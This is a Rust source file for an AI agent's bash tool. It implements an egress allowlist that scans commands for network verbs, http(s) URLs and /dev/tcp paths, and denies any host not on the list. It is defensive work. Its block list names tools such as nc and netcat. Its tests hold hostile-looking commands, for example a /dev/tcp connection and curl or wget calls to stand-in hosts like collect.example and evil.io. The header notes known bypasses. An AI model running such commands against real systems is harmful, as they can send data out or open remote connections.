//! The bash egress allowlist: `CRAFT_AGENT_EGRESS_ALLOWLIST` names the
//! hosts a command may talk to, and the bash tool scans the command
//! string for network verbs and http(s) URLs before spawning. It is a
//! conservative token scanner, not a shell parser: whatever it cannot
//! resolve to an allowed host is denied, never passed. An unset or empty
//! knob means no gating. The recommended value is
//! `github.com,api.github.com,codeload.github.com,objects.githubusercontent.com`.
//! Known residuals: heredoc bodies are scanned as data, and base64 blobs
//! piped into interpreters are invisible — a tripwire, not a firewall.

use crate::error::ToolError;
use crate::util::truncate_char_boundary;

pub const KNOB: &str = "CRAFT_AGENT_EGRESS_ALLOWLIST";

const MAX_KNOB_BYTES: usize = 4096;
const SNIPPET_CAP: usize = 120;
const NETWORK_VERBS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "netcat", "telnet", "ssh", "scp", "sftp",
];
const DEV_HOST_PREFIXES: &[&str] = &["/dev/tcp/", "/dev/udp/"];

/// The allowed hosts a command may talk to; a non-empty knob that names
/// no host denies every network command.
pub struct Allowlist {
    hosts: Vec<String>,
}

impl Allowlist {
    fn require(&self, host: &str) -> Result<(), ToolError> {
        if self.hosts.iter().any(|entry| entry == host) {
            return Ok(());
        }
        Err(ToolError::EgressHostDenied {
            host: host.to_string(),
        })
    }
}

/// The allowlist named by the knob, or None when the gate is off.
pub fn allowlist(knob: Option<&str>) -> Option<Allowlist> {
    let value = knob?;
    if value.trim().is_empty() {
        return None;
    }
    if value.len() > MAX_KNOB_BYTES {
        return Some(Allowlist { hosts: Vec::new() });
    }
    Some(Allowlist {
        hosts: value
            .split(',')
            .map(|entry| entry.trim().to_lowercase())
            .filter(|entry| !entry.is_empty())
            .collect(),
    })
}

/// Deny `command` if any network verb, http(s) URL, or bash /dev/tcp
/// path resolves to a host outside `allowed`.
pub fn check(command: &str, allowed: &Allowlist) -> Result<(), ToolError> {
    let tokens = tokenize(command);
    for (idx, token) in tokens.iter().enumerate() {
        for host in [token.url_host()?, token.dev_host()?].into_iter().flatten() {
            allowed.require(&host)?;
        }
        if NETWORK_VERBS.contains(&token.text.as_str()) {
            let target = verb_target(&tokens, idx)?;
            allowed.require(&target.host_of()?)?;
        }
        if token.is_bypass_flag() {
            return Err(token.unresolved());
        }
    }
    Ok(())
}

/// The first non-option token after the verb inside its own command
/// segment; a verb with no such token is unresolvable.
fn verb_target(tokens: &[Token], verb_idx: usize) -> Result<&Token, ToolError> {
    let segment = tokens[verb_idx].segment;
    for token in tokens.iter().skip(verb_idx + 1) {
        if token.segment != segment {
            break;
        }
        if token.text.starts_with('-') {
            continue;
        }
        return Ok(token);
    }
    Err(tokens[verb_idx].unresolved())
}

/// One shell word and the command segment it belongs to; `;`, `|`, `&`,
/// `(`, `)`, `<`, `>` start new segments, quotes and backticks are
/// delimiters, and `#` at a word start comments out the rest of the line.
struct Token {
    text: String,
    segment: usize,
}

impl Token {
    /// The host of an http(s) URL word; any other `<scheme>://authority`
    /// form is unresolvable because only http(s) hosts are checked.
    fn url_host(&self) -> Result<Option<String>, ToolError> {
        let lower = self.text.to_lowercase();
        if let Some(rest) = lower
            .strip_prefix("http://")
            .or_else(|| lower.strip_prefix("https://"))
        {
            return Ok(Some(self.host_after_scheme(rest)?));
        }
        if self.is_foreign_scheme() {
            return Err(self.unresolved());
        }
        Ok(None)
    }

    /// The host inside a bash /dev/tcp/ or /dev/udp/ word.
    fn dev_host(&self) -> Result<Option<String>, ToolError> {
        for prefix in DEV_HOST_PREFIXES {
            if let Some(rest) = self.text.strip_prefix(*prefix) {
                let Some(host) = rest.split('/').next().filter(|h| !h.is_empty()) else {
                    return Err(self.unresolved());
                };
                return Ok(Some(host.to_lowercase()));
            }
        }
        Ok(None)
    }

    /// The host of a verb's target word: a URL, a `user@host` form, a
    /// `host:port` or scp-style `host:path` form, or a bare host. A
    /// target with an expansion character in it is unresolvable.
    fn host_of(&self) -> Result<String, ToolError> {
        if self.text.is_empty() || self.text.contains(['$', '`']) {
            return Err(self.unresolved());
        }
        let lower = self.text.to_lowercase();
        if let Some((_, rest)) = lower.split_once("://") {
            return self.host_after_scheme(rest);
        }
        let word = lower
            .split_once('/')
            .map_or(lower.as_str(), |(before, _)| before);
        let after_user = word.rsplit_once('@').map_or(word, |(_, after)| after);
        let host = after_user
            .split_once(':')
            .map_or(after_user, |(before, _)| before);
        if host.is_empty() {
            return Err(self.unresolved());
        }
        Ok(host.to_string())
    }

    /// The host inside the post-scheme part of a URL. `rest` arrives
    /// lowercased; this token names the original word in error snippets.
    fn host_after_scheme(&self, rest: &str) -> Result<String, ToolError> {
        let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
        let host_port = match authority.rsplit_once('@') {
            Some((_, after)) => after,
            None => authority,
        };
        let host = if let Some(rest) = host_port.strip_prefix('[') {
            let Some((literal, _)) = rest.split_once(']').filter(|(l, _)| !l.is_empty()) else {
                return Err(self.unresolved());
            };
            format!("[{literal}]")
        } else {
            host_port
                .split_once(':')
                .map_or(host_port, |(before, _)| before)
                .to_string()
        };
        if host.is_empty() {
            return Err(self.unresolved());
        }
        Ok(host)
    }

    /// A scheme-like `<scheme>://` head that is not http(s); only http(s)
    /// hosts are resolvable, so anything else denies. An empty authority
    /// tail is not a URL and stays passable.
    fn is_foreign_scheme(&self) -> bool {
        let lower = self.text.to_lowercase();
        let Some(at) = lower.find("://") else {
            return false;
        };
        let scheme = lower.get(..at).unwrap_or_default();
        self.looks_like_scheme(scheme) && !lower.get(at + 3..).unwrap_or_default().is_empty()
    }

    /// An RFC-3986 scheme head followed only by scheme characters.
    fn looks_like_scheme(&self, word: &str) -> bool {
        let mut chars = word.chars();
        let first_ok = chars.next().is_some_and(|c| c.is_ascii_alphabetic());
        first_ok && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
    }

    /// Any argument form that reroutes a transfer away from the URL's
    /// host: curl --resolve/--connect-to and their separated/attached
    /// spellings.
    fn is_bypass_flag(&self) -> bool {
        self.text == "--resolve"
            || self.text == "--connect-to"
            || self.text.starts_with("--resolve=")
            || self.text.starts_with("--connect-to=")
    }

    /// A scanner denial naming this word.
    fn unresolved(&self) -> ToolError {
        ToolError::EgressUnresolved {
            snippet: truncate_char_boundary(&self.text, SNIPPET_CAP).to_string(),
        }
    }
}

/// The scanner state for one command string.
#[derive(Default)]
struct Tokenizer {
    tokens: Vec<Token>,
    current: String,
    segment: usize,
    in_comment: bool,
}

impl Tokenizer {
    fn push(&mut self, c: char) {
        if self.in_comment {
            self.in_comment = c != '\n';
        } else if c == '#' && self.current.is_empty() {
            self.in_comment = true;
        } else if breaks_segment(c) {
            self.flush();
            self.segment += 1;
        } else if is_delimiter(c) {
            self.flush();
        } else {
            self.current.push(c);
        }
    }

    fn flush(&mut self) {
        if !self.current.is_empty() {
            self.tokens.push(Token {
                text: std::mem::take(&mut self.current),
                segment: self.segment,
            });
        }
    }
}

fn tokenize(command: &str) -> Vec<Token> {
    let mut scanner = Tokenizer::default();
    for c in command.chars() {
        scanner.push(c);
    }
    scanner.flush();
    scanner.tokens
}

fn breaks_segment(c: char) -> bool {
    matches!(c, ';' | '|' | '&' | '(' | ')' | '<' | '>')
}

fn is_delimiter(c: char) -> bool {
    matches!(c, '\'' | '"' | '`') || c.is_whitespace()
}

#[cfg(test)]
mod tests {
    use super::{Allowlist, Token, allowlist, check, tokenize};

    const ALLOWED: &[&str] = &["github.com", "api.github.com"];

    fn allowed() -> Allowlist {
        Allowlist {
            hosts: ALLOWED.iter().map(|h| h.to_string()).collect(),
        }
    }

    fn token(text: &str) -> Token {
        Token {
            text: text.to_string(),
            segment: 0,
        }
    }

    #[test]
    fn url_host_shapes() {
        for (raw, host) in [
            ("api.github.com/repos/o/r", "api.github.com"),
            ("user:pass@github.com/x", "github.com"),
            ("github.com:8443/x", "github.com"),
            ("[::1]:8080/x", "[::1]"),
            ("", ""),
        ] {
            let found = token(raw).host_after_scheme(raw).unwrap_or_default();
            assert_eq!(found, host, "{raw}");
        }
        assert!(token("x").host_after_scheme("").is_err());
    }

    #[test]
    fn non_http_schemes_are_unresolvable() {
        for raw in [
            "file:///etc/passwd",
            "ftp://collect.example/x.tgz",
            "sftp://collect.example/x",
            "gopher://collect.example/",
        ] {
            let only = &tokenize(raw)[0];
            assert!(only.url_host().is_err(), "{raw} must deny");
        }
        // Flags, paths and globby words are not erroring URLs.
        for word in ["--output=/dev/null", "wall://clock", "-o"] {
            assert!(
                token(word).url_host().unwrap_or_default().is_none(),
                "{word}"
            );
        }
    }

    #[test]
    fn verb_target_host_shapes() {
        for (raw, host) in [
            ("https://github.com", "github.com"),
            ("HTTPS://GitHub.Com/X", "github.com"),
            ("git@github.com:owner/repo.git", "github.com"),
            ("github.com:443", "github.com"),
            ("evil.com/path", "evil.com"),
        ] {
            assert_eq!(token(raw).host_of().unwrap_or_default(), host, "{raw}");
        }
        for raw in ["", "$URL", "`x`", "https://", ":80", "/x"] {
            assert!(token(raw).host_of().is_err(), "{raw} must be unresolvable");
        }
    }

    #[test]
    fn knob_parsing() {
        assert!(allowlist(None).is_none());
        assert!(allowlist(Some("")).is_none());
        assert!(allowlist(Some("  ")).is_none());
        assert_eq!(
            allowlist(Some(" GitHub.COM , api.github.com ,,")).map(|list| list.hosts.len()),
            Some(2)
        );
        assert!(allowlist(Some(",")).is_some_and(|list| list.hosts.is_empty()));
    }

    #[test]
    fn scanner_decisions() {
        assert!(check("echo hello", &allowed()).is_ok());
        assert!(check("echo curl https://api.github.com/x", &allowed()).is_ok());
        for denied in [
            "echo https://collect.example/x",
            "wget collect.example/f.tar",
            "telnet collect.example 23",
            "sftp user@collect.example",
            "curl -sSL https://evil.io/x",
            "bash -c 'curl https://collect.example'",
            "exec 3<>/dev/tcp/collect.example/80",
        ] {
            assert!(check(denied, &allowed()).is_err(), "{denied}");
        }
    }
}
